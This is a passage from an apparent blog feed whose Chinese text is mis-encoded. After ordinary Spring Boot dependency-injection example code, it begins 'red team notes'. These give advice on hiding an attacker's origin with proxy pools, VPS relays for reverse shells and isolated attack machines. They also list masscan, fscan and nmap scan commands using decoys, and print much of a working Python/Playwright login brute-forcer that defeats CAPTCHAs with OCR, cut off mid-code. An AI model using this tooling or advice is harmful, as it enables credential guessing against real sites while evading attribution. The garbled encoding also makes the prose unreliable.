</li>
<li><p>é¡¹ç›®ç»“æ„</p>
<p> <img src="https://gitee.com/shaoxinsec/picgo_images/raw/master/image-20251110224556678.png" alt="image-20251110224556678"></p>
</li>
<li><p>å…³é”®ä»£ç å±•ç¤ºï¼ˆIOC&#x2F;DIï¼‰</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**é€šè¿‡<span class="doctag">@Component</span>æ³¨è§£ï¼Œå°†è¿™ä¸ªç±»æ³¨å†Œä¸ºSBçš„ä¸€ä¸ªç»„ä»¶ï¼Œäº¤ç»™SBæ¡†æ¶è¿›è¡Œç®¡ç†****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl1</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserDao1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**é€šè¿‡<span class="doctag">@Component</span>æ³¨è§£ï¼Œå°†è¿™ä¸ªç±»æ³¨å†Œä¸ºSBçš„ä¸€ä¸ªç»„ä»¶ï¼Œäº¤ç»™SBæ¡†æ¶è¿›è¡Œç®¡ç†****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoImpl2</span> <span class="keyword">implements</span> <span class="title class_">UserDao</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UserDao2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.dao.UserDao;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span>  <span class="comment">//æ³¨å†Œä¸ºSBçš„ä¸€ä¸ªç»„ä»¶</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span>&#123;</span><br><span class="line">    <span class="meta">@Qualifier(&quot;userDaoImpl2&quot;)</span>  <span class="comment">//å¦‚æœæœ‰å¤šä¸ªç±»å‹ç›¸åŒçš„ç»„ä»¶ï¼Œéœ€è¦æ ¹æ®å…·ä½“çš„ç±»ï¼ŒæŒ‡å®šè¦å…³è”å“ªä¸€ä¸ªç»„ä»¶</span></span><br><span class="line">    <span class="meta">@Autowired</span>  <span class="comment">//è‡ªåŠ¨å…³è”ç±»ä¸ºUserDaoçš„ç»„ä»¶</span></span><br><span class="line">    UserDao userDao;  <span class="comment">//è¿™ä¸‰è¡Œä»£ç ç›¸å½“äºï¼šUserDao userDao = new userDaoImpl2();</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(userDao.getUser());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="comment">/**é€šè¿‡æ³¨è§£ï¼Œå‘Šè¯‰SBè¿™æ˜¯ä¸€ä¸ªé…ç½®ç±»****/</span></span><br><span class="line"><span class="comment">/******************************************************************/</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;top.shaoxinsec.springstudy&quot;)</span>  <span class="comment">//å‘Šè¯‰SBï¼Œè¦ç®¡ç†å“ªä¸ªåŒ…ä¸‹é¢çš„ç»„ä»¶</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaConfig</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>å•å…ƒæµ‹è¯•</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.shaoxinsec.springstudy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.config.JavaConfig;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.service.UserService;</span><br><span class="line"><span class="keyword">import</span> top.shaoxinsec.springstudy.service.UserServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test01</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span>  <span class="comment">//å¦‚æœæŠ¥é”™ï¼Œåœ¨pom.xmlä¸­æ·»åŠ junitä¾èµ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//è·å–SBå®¹å™¨ï¼ˆè¿™é‡Œæ˜¯æ ¹æ®JavaConfigè¿™ä¸ªç±»åˆ›å»ºå‡ºæ¥çš„å®¹å™¨ï¼‰</span></span><br><span class="line">        <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">ioc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(JavaConfig.class);</span><br><span class="line">        <span class="comment">//è·å–å®¹å™¨ä¸­çš„ä¸€ä¸ªBean</span></span><br><span class="line">        <span class="type">UserService</span> <span class="variable">us</span> <span class="operator">=</span> ioc.getBean(UserServiceImpl.class);</span><br><span class="line">        us.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç¨‹åºè¾“å‡ºï¼šUserDao2</span></span><br><span class="line"><span class="comment">Start ==&gt; ioc ==&gt; JavaConfig.class ==&gt; top.shaoxinsec.springstudy ==&gt; UserServiceImpl(IOC/DIä¹‹å) ==&gt; getUser()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>å¼€å‘</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>åç«¯</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>çº¢é˜Ÿç¬”è®°</title>
    <url>/RedteamNotes.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="åæº¯æº"><a href="#åæº¯æº" class="headerlink" title="åæº¯æº"></a>åæº¯æº</h2><ol>
<li><p>ç½‘ç»œéš”ç¦»ï¼š</p>
<ul>
<li><p>ç³»ç»Ÿä»£ç†ï¼šClashVerge&#x2F;V2rayN + æœºåœºèŠ‚ç‚¹</p>
</li>
<li><p>ä»£ç†æ± ï¼šçˆ†ç ´çš„æ—¶å€™ï¼Œé€‰æ‹©ä»£ç†æ± ï¼Œé¿å…å•ä¸ªèŠ‚ç‚¹è¢«å°</p>
  <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">[proxifly|æ¯5minè·å–å…¨çƒå…è´¹èŠ‚ç‚¹]: https://github.com/proxifly/free-proxy-list/blob/main/proxies/all/data.txt</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>ç¯å¢ƒéš”ç¦»ï¼šåœ¨è™šæ‹Ÿæœºé‡Œé¢æ­å»ºæ”»å‡»æœº&#x2F;ä¹°ä¸€å°æ–°æœºå™¨ä¸“é—¨ç”¨æ¥åšæ”»å‡»æœºï¼Œæ”»å‡»æœºä¸å…è®¸å’Œä¸ªäººç”¨æœºæœ‰ç›´æ¥äº¤äº’ã€‚æ€ä¹ˆäº¤æ¢ä¿¡æ¯ï¼šæ”»å‡»æœº(åŠ å¯†æ•°æ®&#x2F;è§£å¯†æ•°æ®) &lt;-&gt; vps(å¯ä»¥æ­ä¸ªæœåŠ¡) &lt;-&gt; PC+ä»£ç†(åŠ å¯†æ•°æ®&#x2F;è§£å¯†æ•°æ®)</p>
</li>
<li><p>æ•°æ®éš”ç¦»ï¼šæ”»å‡»æœºä¸Šé¢ä¸è¦å‡ºç°ä»»ä½•ä¸ªäººæ•°æ®ï¼Œä¸€å¾‹ä¸å‡†ä½¿ç”¨å›½å†…è½¯ä»¶èŠå¤©è½¯ä»¶ï¼Œä½¿ç”¨éªŒè¯ç &#x2F;éšæœºå¯†ç è¿›è¡Œç™»å½•ï¼Œä½¿ç”¨æµ‹è¯•è´¦å·</p>
</li>
<li><p>æ¥æ”¶æ•°æ®ï¼ˆåå¼¹shell&#x2F;å¤–å¸¦æ•°æ®ï¼‰ï¼šåœ¨VPSä¸Šæ¥æ”¶ï¼Œæ”»å‡»æœº+ç³»ç»Ÿä»£ç† -&gt; VPS1 -&gt; â€¦â€¦ -&gt; çˆ†ç ´æœº</p>
</li>
<li><p>VPSï¼šä½¿ç”¨sshå¯†é’¥è¿›è¡Œç™»é™†ï¼Œä¸¥ç¦ä½¿ç”¨å¯†ç </p>
</li>
</ol>
<h1 id="WEBæ‰“ç‚¹"><a href="#WEBæ‰“ç‚¹" class="headerlink" title="WEBæ‰“ç‚¹"></a>WEBæ‰“ç‚¹</h1><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><blockquote>
<p>nmapæ‰«å­˜æ´»ä¸»æœº -&gt; masscan&#x2F;fscanæ‰«ç«¯å£ -&gt; nmapæ‰«æœåŠ¡ç‰ˆæœ¬</p>
</blockquote>
<ol>
<li><p>masscan</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.108.13 --rate 200 --source-ip 192.168.101.2 --source-port 40000-40007 --ttl 64 --wait 2 --randomize-hosts --randomize-ports &gt;&gt; 192_168_108_13_ports.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>fscan</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fscan -h 192.168.108.0/24 &gt;&gt; 192_168_108_0_fscan.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>nmap</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.108.0/24 &gt;&gt; 192_168_108_0_nmap.txt</span><br><span class="line">nmap 192.168.108.13 -p139,49172,445,135,49268,3389,49160,49154,49152,60966,80 -sV -sS -D RND:10 -mtu 8 &gt;&gt; 192_168_108_13_nmap.txt</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="çˆ†ç ´ç™»å½•é¡µ"><a href="#çˆ†ç ´ç™»å½•é¡µ" class="headerlink" title="çˆ†ç ´ç™»å½•é¡µ"></a>çˆ†ç ´ç™»å½•é¡µ</h2><ol>
<li><p>basic-authorize: hydra</p>
</li>
<li><p>æ•°æ®åŒ…æ²¡æœ‰åŠ å¯†ï¼šburpsuite</p>
</li>
<li><p>æ•°æ®åŒ…æœ‰åŠ å¯†ï¼šçˆ¬è™«</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Webç™»å½•çˆ†ç ´å·¥å…·</span></span><br><span class="line"><span class="string">ä½¿ç”¨Playwrightè‡ªåŠ¨åŒ–æµè§ˆå™¨è¿›è¡Œç™»å½•çˆ†ç ´</span></span><br><span class="line"><span class="string">æ ¹æ®è¿”å›çš„é•¿åº¦è¿›è¡Œåˆ¤æ–­</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Tuple</span>, <span class="type">Optional</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> playwright.async_api <span class="keyword">import</span> async_playwright, Browser, BrowserContext, Page</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> ddddocr</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CustomHelpFormatter</span>(argparse.HelpFormatter):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_format_action_invocation</span>(<span class="params">self, action</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> action.option_strings:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>()._format_action_invocation(action)</span><br><span class="line">        default = <span class="variable language_">self</span>._get_default_metavar_for_optional(action)</span><br><span class="line">        args_string = <span class="variable language_">self</span>._format_args(action, default)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;,&#x27;</span>.join(action.option_strings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LoginBruster</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, </span></span><br><span class="line"><span class="params">                 target_url: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 username_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 password_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 captcha_img_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 captcha_input_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 login_button_xpath: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">                 max_threads: <span class="built_in">int</span> = <span class="number">5</span>,</span></span><br><span class="line"><span class="params">                 success_url_contains: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                 success_text_contains: <span class="built_in">str</span> = <span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        åˆå§‹åŒ–ç™»å½•çˆ†ç ´å™¨</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            target_url: ç›®æ ‡URL</span></span><br><span class="line"><span class="string">            username_xpath: ç”¨æˆ·åè¾“å…¥æ¡†XPath</span></span><br><span class="line"><span class="string">            password_xpath: å¯†ç è¾“å…¥æ¡†XPath</span></span><br><span class="line"><span class="string">            captcha_img_xpath: éªŒè¯ç å›¾ç‰‡XPath</span></span><br><span class="line"><span class="string">            captcha_input_xpath: éªŒè¯ç è¾“å…¥æ¡†XPath</span></span><br><span class="line"><span class="string">            login_button_xpath: ç™»å½•æŒ‰é’®XPath</span></span><br><span class="line"><span class="string">            max_threads: æœ€å¤§çº¿ç¨‹æ•°</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.target_url = target_url</span><br><span class="line">        <span class="variable language_">self</span>.username_xpath = username_xpath</span><br><span class="line">        <span class="variable language_">self</span>.password_xpath = password_xpath</span><br><span class="line">        <span class="variable language_">self</span>.captcha_img_xpath = captcha_img_xpath</span><br><span class="line">        <span class="variable language_">self</span>.captcha_input_xpath = captcha_input_xpath</span><br><span class="line">        <span class="variable language_">self</span>.login_button_xpath = login_button_xpath</span><br><span class="line">        <span class="variable language_">self</span>.max_threads = max_threads</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.results = []</span><br><span class="line">        <span class="variable language_">self</span>.lock = threading.Lock()</span><br><span class="line">        <span class="variable language_">self</span>.success_count = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.failed_count = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_wordlist</span>(<span class="params">self, file_path: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;åŠ è½½å­—å…¸æ–‡ä»¶&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="keyword">return</span> [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;é”™è¯¯ï¼šæ‰¾ä¸åˆ°æ–‡ä»¶ <span class="subst">&#123;file_path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;åŠ è½½æ–‡ä»¶ <span class="subst">&#123;file_path&#125;</span> æ—¶å‡ºé”™ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">preprocess_captcha</span>(<span class="params">self, image_data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        é¢„å¤„ç†éªŒè¯ç å›¾ç‰‡å¹¶è¯†åˆ«</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            image_data: å›¾ç‰‡æ•°æ®</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            è¯†åˆ«å‡ºçš„éªŒè¯ç æ–‡æœ¬</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># ä½¿ç”¨ddddocrè¿›è¡ŒéªŒè¯ç è¯†åˆ«</span></span><br><span class="line">            ocr = ddddocr.DdddOcr(show_ad=<span class="literal">False</span>)</span><br><span class="line">            text = ocr.classification(image_data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;éªŒè¯ç è¯†åˆ«ç»“æœ: <span class="subst">&#123;text&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> text.strip()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;éªŒè¯ç è¯†åˆ«å¤±è´¥ï¼šæœªè¯†åˆ«å‡ºæ–‡æœ¬&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;éªŒè¯ç è¯†åˆ«å¤±è´¥ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">solve_captcha</span>(<span class="params">self, page: Page</span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        è§£å†³éªŒè¯ç </span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            page: Playwrighté¡µé¢å¯¹è±¡</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            éªŒè¯ç æ–‡æœ¬æˆ–None</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># æ£€æŸ¥éªŒè¯ç XPathæ˜¯å¦æœ‰æ•ˆ</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.captcha_img_xpath <span class="keyword">or</span> <span class="keyword">not</span> <span class="variable language_">self</span>.captcha_input_xpath:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                </span><br><span class="line">            <span class="comment"># ç­‰å¾…éªŒè¯ç å›¾ç‰‡åŠ è½½</span></span><br><span class="line">            <span class="keyword">await</span> page.wait_for_selector(<span class="string">f&quot;xpath=<span class="subst">&#123;self.captcha_img_xpath&#125;</span>&quot;</span>, timeout=<span class="number">5000</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># è·å–éªŒè¯ç å›¾ç‰‡</span></span><br><span class="line">            captcha_locator = page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.captcha_img_xpath&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ£€æŸ¥å…ƒç´ æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">await</span> captcha_locator.count() == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">                </span><br><span class="line">            <span class="comment"># æˆªå›¾è·å–éªŒè¯ç </span></span><br><span class="line">            screenshot = <span class="keyword">await</span> captcha_locator.first.screenshot()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># è¯†åˆ«éªŒè¯ç </span></span><br><span class="line">            captcha_text = <span class="variable language_">self</span>.preprocess_captcha(screenshot)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> captcha_text:</span><br><span class="line">                <span class="comment"># è¾“å…¥éªŒè¯ç </span></span><br><span class="line">                <span class="keyword">await</span> page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.captcha_input_xpath&#125;</span>&quot;</span>).fill(captcha_text)</span><br><span class="line">                <span class="keyword">return</span> captcha_text</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;éªŒè¯ç å¤„ç†å¤±è´¥ï¼š<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">attempt_login</span>(<span class="params">self, username: <span class="built_in">str</span>, password: <span class="built_in">str</span>, thread_id: <span class="built_in">int</span></span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        å°è¯•ç™»å½•</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            username: ç”¨æˆ·å</span></span><br><span class="line"><span class="string">            password: å¯†ç </span></span><br><span class="line"><span class="string">            thread_id: çº¿ç¨‹ID</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            ç™»å½•ç»“æœå­—å…¸</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        result = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">            <span class="string">&#x27;username_length&#x27;</span>: <span class="built_in">len</span>(username),</span><br><span class="line">            <span class="string">&#x27;password_length&#x27;</span>: <span class="built_in">len</span>(password),</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&#x27;thread_id&#x27;</span>: thread_id,</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>: time.time()</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">async</span> <span class="keyword">with</span> async_playwright() <span class="keyword">as</span> p:</span><br><span class="line">                <span class="comment"># å¯åŠ¨æµè§ˆå™¨</span></span><br><span class="line">                browser = <span class="keyword">await</span> p.chromium.launch(headless=<span class="literal">True</span>)</span><br><span class="line">                context = <span class="keyword">await</span> browser.new_context()</span><br><span class="line">                page = <span class="keyword">await</span> context.new_page()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># è®¿é—®ç›®æ ‡é¡µé¢</span></span><br><span class="line">                <span class="keyword">await</span> page.goto(<span class="variable language_">self</span>.target_url, wait_until=<span class="string">&#x27;networkidle&#x27;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å¡«å†™ç”¨æˆ·åå’Œå¯†ç </span></span><br><span class="line">                <span class="keyword">await</span> page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.username_xpath&#125;</span>&quot;</span>).fill(username)</span><br><span class="line">                <span class="keyword">await</span> page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.password_xpath&#125;</span>&quot;</span>).fill(password)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å¤„ç†éªŒè¯ç ï¼ˆå¦‚æœå­˜åœ¨ï¼‰</span></span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.captcha_img_xpath <span class="keyword">and</span> <span class="variable language_">self</span>.captcha_input_xpath:</span><br><span class="line">                    captcha_text = <span class="keyword">await</span> <span class="variable language_">self</span>.solve_captcha(page)</span><br><span class="line">                    <span class="keyword">if</span> captcha_text:</span><br><span class="line">                        result[<span class="string">&#x27;captcha&#x27;</span>] = captcha_text</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># ç‚¹å‡»ç™»å½•æŒ‰é’®</span></span><br><span class="line">                <span class="keyword">await</span> page.locator(<span class="string">f&quot;xpath=<span class="subst">&#123;self.login_button_xpath&#125;</span>&quot;</span>).click()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># ç­‰å¾…é¡µé¢å“åº”</span></span><br><span class="line">                <span class="keyword">await</span> page.wait_for_timeout(<span class="number">2000</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># è·å–é¡µé¢å†…å®¹ç”¨äºé•¿åº¦åˆ†æ</span></span><br><span class="line">                page_content = <span class="keyword">await</span> page.content()</span><br><span class="line">                content_length = <span class="built_in">len</span>(page_content)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å°†å“åº”é•¿åº¦ä¿å­˜åˆ°ç»“æœä¸­ï¼Œç”¨äºåç»­åˆ†æ</span></span><br><span class="line">                result[<span class="string">&#x27;response_length&#x27;</span>] = content_length</span><br><span class="line">                result[<span class="string">&#x27;final_url&#x27;</span>] = page.url</span><br><span class="line">                </span><br><span class="line">                <span 